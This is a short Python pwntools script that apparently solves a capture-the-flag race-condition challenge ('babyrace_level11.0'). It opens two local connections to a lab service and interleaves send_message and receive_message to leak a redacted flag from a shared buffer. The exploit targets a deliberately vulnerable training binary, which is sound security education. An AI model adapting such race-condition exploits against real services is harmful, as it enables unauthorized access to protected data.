from pwn import *
p = process("/challenge/babyrace_level11.0")
while True:
    p1 = connect("127.0.0.1", 1337)
    p2 = connect("127.0.0.1", 1337)
    p1.recvuntil("Function (send_message/send_redacted_flag/receive_message/quit):")
    p1.sendline("send_redacted_flag")
    while True:
        a = p1.recvline()
        if a.find(b"Paused") != -1:
            p1.sendline("AAAAAAA")
        elif a.find(b"Function") != -1:
            break
    
    p1.sendline("send_message")
    #p2.recvuntil("Function (login/logout/win_authed/quit):")
    p1.recvuntil(" ")
    p1.sendline("123456789ABCDED")
    i=0
    while True:
        a = p1.recvline()
        if a.find(b"message[11]") != -1:
            break
        if a.find(b"Paused") != -1:
            p1.sendline("AAAAAAA")
            i+=1

    # p1.sendline("AAAAAAA")
    # p2.sendline("AAAAAAA")
    p2.recvuntil("Function (send_message/send_redacted_flag/receive_message/quit):")
    p2.sendline("receive_message")
    a = p2.recvall(timeout=1)
    p1.close()
    p2.close()
    print(a)
    break
    if a.find(b"college") != -1:
        print(a)
        break

p.close()

